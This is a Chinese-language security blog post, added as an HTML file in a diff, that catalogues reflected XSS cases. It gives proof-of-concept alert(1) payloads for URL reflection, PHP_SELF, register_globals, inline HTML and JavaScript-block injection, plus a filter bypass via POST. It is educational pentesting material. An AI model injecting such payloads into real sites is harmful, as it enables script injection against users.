@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!--
+    * Author:         Corener
+    * Revised:        Corener
+    -->
+    <meta charset="utf-8" />
+    <title>XSS的常见情况总结 | Corener in Learning</title>
+    <meta name="author" content="Corener" />
+    <meta name="renderer" content="webkit">
+    <meta name="description" content="Everything about Corener" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <link rel="stylesheet" href="/css/default.css" type="text/css" />
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="alternate" type="application/atom+xml" title="Recent Entries" href="/atom.xml" />
+    <script src="/js/jquery-1.7.1.min.js" type="text/javascript"></script>
+</head>
+<body>
+
+    <div class="home-menu">
+        <div class="home-icon-con">
+            <a class="home-menu-icon" href="/">Corener</a>
+            <a class="home-follow" href="#" title="Contact Me">+</a>
+        </div>
+        <div class="home-contact">
+            <a href="https://github.com/Corener/" target="_blank" style="margin-left:-5px;"><img src="https://github.com/favicon.ico" alt="" width="22"/></a>
+            <a href="http://www.douban.com/people/Corenerindouban/" target="_blank" style="text-align:center;"><img src="http://www.douban.com/favicon.ico" alt="" width="22"/></a>
+            <a href="http://www.zhihu.com/people/Corenerinzhihu" target="_blank" style="text-align:right"><img src="http://www.zhihu.com/favicon.ico" alt="" width="22"/></a>
+        </div>
+    </div>
+
+    <link rel="stylesheet" href="/js/prettify/prettify.css" />
+<style type="text/css">
+    body { background:#e8e8e8; }
+    @media screen and (max-width: 750px){
+        body { background:#fff; }
+    }
+    @media screen and (max-width: 1020px){
+        body { background:#fff; }
+    }
+</style>
+
+<div id="content">
+    <div class="entry">
+        <h1 class="entry-title"><a href="/summarize-of-XSS-with-case" title="XSS的常见情况总结">XSS的常见情况总结</a></h1>
+        <p class="entry-date">2017-08-16</p>
+        <p>作者： <a href="http://corener.github.io/">corener</a></p>
+
+<hr />
+
+<p>最近检测了几批网站，也碰到很多有关XSS的漏洞情况，个人进行一些搜集和总结，有些是网站浏览到的很棒的技术贴，有些是实际自己碰到的情况，以及自己的一些看法。</p>
+
+<p>首先列举常见的XSS案例，来自于网上的技术贴，最下面给出了连接，主要是参考<a href="https://brutelogic.com.br/xss.php">https://brutelogic.com.br/xss.php</a>里的xss案例</p>
+
+<h2 id="case1url反射">case1：url反射</h2>
+<p>这种情况，一般是源码中存在url反射，构造方式:</p>
+
+<pre><code>http://brutelogic.com.br/xss.php/”&gt;&lt;svg onload=alert(1)&gt;
+</code></pre>
+
+<p>对于PHP的页面，可以通过使用斜杠”/”在页面的名称后<strong>添加任何内容</strong>,用开头的(“&gt;)标签来破坏当前标签的闭合状态，为将插入的新标签(触发XSS的代码标签)创造可能的闭合条件。</p>
+
+<pre><code>&lt;!—URL Reflection --&gt;
+&lt;form action=”/xss.php/”&gt;&lt;svg onload=alert(1)&gt;” method=”POST”&gt;
+&lt;br&gt;
+</code></pre>
+
+<p>不同语言的差异造成的不同的触发原因(反射可能出现在路径或URL参数中),利用语言特性，可以构造一些不同的xss，比如</p>
+<ul>
+  <li>phpinfo() XSS<br />
+  在低版本的php对于用户输入变量没有转移就打印出来</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="nl">http:</span><span class="c1">//123.com/phpinfo.php?a[]=&lt;script&gt;alert(xss)&lt;/script&gt;</span></code></pre></figure>
+
+<ul>
+  <li>全局变量$_SERVER[PHP_SELF]<br />
+  $_SERVER[PHP_SELF] 是php语言中的全局变量，代表当前路径相对根目录的位置,常见的代码段：</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="n">method</span><span class="o">=</span><span class="s">&quot;post&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s">&quot;&lt;?php echo $_SERVER[‘PHP_SELF’]； ?&gt;&quot;</span><span class="o">&gt;</span>
+	<span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s">&quot;1&quot;</span><span class="o">&gt;</span>
+	<span class="o">&lt;</span><span class="n">input</span> <span class="n">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span>  <span class="n">value</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span></code></pre></figure>
+
+<p>构造方式：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="nl">http:</span><span class="c1">//123.com/data.php/&quot;&gt;&lt;script&gt;alert(xss)&lt;/script&gt;&lt;</span></code></pre></figure>
+
+<p>除了PHP_SELF，其他的$_SERVER变量可能存在类似漏洞，如：SCRIPT_URI，QUERY_STRING，PATH_NFO等</p>
+<ul>
+  <li>变量覆盖<br />
+<strong>register_globals=on</strong><br />
+register_globals=on是php.ini里的一个配置，默认php4.2.0以上会屏蔽，能够导致全局变量覆盖，包括请求的变量，源代码中有( echo $a; )</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="nl">http:</span><span class="c1">//123.com/test.php?a=&lt;script&gt;alert(xss)&lt;/script&gt;</span></code></pre></figure>
+
+<p><strong>extract()方法</strong><br />
+extract()将变量从数组导入到当前符号表中。源代码中有( extract($GET); echo $a; )</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span></span><span class="nl">http:</span><span class="c1">//123.com/test.php?a=&lt;script&gt;alert(xss)&lt;/script&gt;</span></code></pre></figure>
+
+<h2 id="case2简单的html注入">case2：简单的HTML注入</h2>
+<p>这种情况，用户输入就是反射，不需破坏任何标签。</p>
+
+<pre><code>http://brutelogic.com.br/xss.php?a=&lt;svg onload=alert(1)&gt;
+</code></pre>
+
+<p>exploit后：</p>
+
+<pre><code>&lt;h1&gt;XSS Test&lt;/h1&gt;
+&lt;!-- Simple HTMLi --&gt;
+Hello, &lt;svg onload=alert(1)&gt;!
+&lt;br&gt;
+</code></pre>
+
+<h2 id="case3inline-html注入">case3：inline HTML注入</h2>
+<p>相比case2，需要”&gt;”闭合前面的标签,重新构造标签</p>
+
+<pre><code>&lt;!-- Inline HTMLi (Double Quotes) --&gt;
+&lt;input type="text" name="b1" value=""&gt;&lt;svg onload=alert(1)&gt;"&gt;
+&lt;br&gt;
+</code></pre>
+
+<h2 id="case4inline-html注入被过滤">case4：inline HTML注入，”&gt;”被过滤</h2>
+<p>html中对”&gt;”进行了过滤，构造方式：</p>
+
+<pre><code>http://brutelogic.com.br/xss.php?b3=" onmouseover=alert(1)//
+</code></pre>
+
+<p>exploit后：</p>
+
+<pre><code>&lt;input type="text" name="b3" value="" onmouseover=alert(1)//"&gt;
+&lt;br&gt;
+</code></pre>
+
+<p>这里闭合value的引号，并插入了onmouseover事件，alert(1)之后的双引号通过”//”注释掉，当鼠标移动到输入框时触发js弹窗</p>
+
+<h2 id="case5js块-html注入">case5：JS块 HTML注入</h2>
+<p>输入有时候会传入到javascript代码块中，这些输入通常是代码中的一些变量的值。但因为HTML标签在浏览器的解析中有优先级，所以我们可以通过js标签闭合原有的js代码块并插入一个新的标签插入传入你需要的js代码。<br />
+构造：</p>
+
+<pre><code>http://brutelogic.com.br/xss.php?c1=&lt;/script&gt;&lt;svg onload=alert(1)&gt;
+</code></pre>
+
+<p>exploit后：</p>
+
+<pre><code>var myVar1 = '&lt;/script&gt;&lt;svg onload=alert(1)&gt;';
+</code></pre>
+
+<h2 id="case6简单js注入">case6：简单JS注入</h2>
+<p>如果脚本的标签被某种方式过滤掉了，之前讨论的方法也随之失效。<br />
+这里可以根据语法注入javascript代码。一个已知的方法是用我们想要执行的代码”连接”到可触发漏洞的变量。因为我们不能让任何单引号引起报错，所以先构造闭合，然后使用”-”连接来获得一个有效的javascript代码。<br />
+explit后：</p>
+
+<pre><code>http://brutelogic.com.br/xss.php?c3=’-alert(1)-‘
+// Simple Js Injection (Single Quotes)
+var myVar3 = ''-alert(1)-'';
+</code></pre>
+
+<h2 id="case7过滤的js注入">case7：过滤的JS注入</h2>
+<p>case6中的引号如果被转义了，需要重新构造：</p>
+
+<pre><code>http://brutelogic.com.br/xss.php?c5=\'-alert(1)//
+// Escaped Js Injection (Single Quotes)
+var myVar5 = '\\'-alert(1)-//';
+</code></pre>
+
+<p>我们可以插入一个前反斜杠，这样后面的引号将会完成闭合，从而触发传入的js代码。在插入我们想要执行的js代码后，需要对其余部分进行注释，因为剩余的部分已经无需执行或重复执行。<br />
+有关转义字符：<br />
+所有的ASCII码都可以用“\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”"来表示常见的那些不能显示的ASCII字符，如\0,\t,\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。<br />
+<strong>从左向右的转义方式，使得\左边的\将右边的\转义了，使其失去效果，也就是\可能变成@字符(随便举例)</strong></p>
+
+<h2 id="经验总结">经验总结</h2>
+
+<p>直接通过URL通过GET请求触发XSS返回404，通过参数直接访问可以显示正常界面，那么应该是被过滤了。先自己用xsstrike跑了一下，提示是存在XSS的，但是打开浏览器的反应都是返回了空白页面，说明是多次的误报(xsstrike不是基于webkit，因此容易产生误报)。</p>
+
+<p>而后查看源码，在页面可以看到前端通过正则过滤了特殊字符，重定向到404页面。</p>
+
+<p>http://p5.qhimg.com/t0131dc2a58079ec671.png</p>
+
+<p>http://p2.qhimg.com/t018956580a7e10c3f4.png</p>
+
+<p>过滤的很全乎，那看起来好像是没戏了，遂去请教大神，所以姿势就涨起来了。</p>
+
+<p>这里的原因是因为后端PHP在处理请求的时候使用的是$_REQUEST方法，因此可接受POST和GET请求。</p>
+
+<p>So，成功弹窗。</p>
+
+<p><br /><br /><br />
+多数的反射型xss总归来说，是属于客户端的漏洞，不管是标签还是JS代码，都是在客户端执行，因此对于xss的检测，可以结合页面源码来构造，针对不同情况构造不同的payload。</p>
+
+<hr />
+
+<p>以上只是自己肤浅的总结，后面还有很多知识需要更新和添加，希望自己不断成长！<br />
+<a href="http://corener.github.io/">corener</a><br />
+<a href="https://brutelogic.com.br/xss.php">xss练习站点</a><br />
+xss工具：xsstrike
+参考链接:<a href="https://m.bobao.360.cn/learning/detail/4223.html">安全客</a></p>
+
+    </div>
+
+    <div class="sidenav">
+        <h2>Blog</h2>
+        <ul class="artical-list">
+        
+            <li><a href="/MsSql_wiki">有关MsSql注入的备忘录</a></li>
+        
+            <li><a href="/summarize-of-XSS-with-case">XSS的常见情况总结</a></li>
+        
+            <li><a href="/summarize_of_webshell_fileUpload">有关上传webshell文件绕过的总结</a></li>
+        
+            <li><a href="/01-Hacking-learning-and-summarize">Hacking-learning-and-summarize</a></li>
+        
+            <li><a href="/java-virtual-mechine">Java虚拟机简介</a></li>
+        
+            <li><a href="/web-server">也谈如何构建高性能服务端程序</a></li>
+        
+            <li><a href="/markdown-basics">markdown 快速入门</a></li>
+        
+        </ul>
+
+        <h2>Dump</h2>
+        <ul class="artical-list">
+        
+        </ul>
+
+        <h2>Project</h2>
+        <ul class="artical-list">
+        
+        </ul>
+    </div>
+</div>
+
+<script src="/js/post.js" type="text/javascript"></script>
+
+
+    <script type="text/javascript">
+        $(function(){
+            $('.home-follow').click(function(e){
+                e.preventDefault();
+
+                if($('.home-contact').is(':visible')){
+                    $('.home-contact').slideUp(100);
+                }else{
+                    $('.home-contact').slideDown(100);
+                }
+            });
+        })
+    </script>
+</body>
+</html>
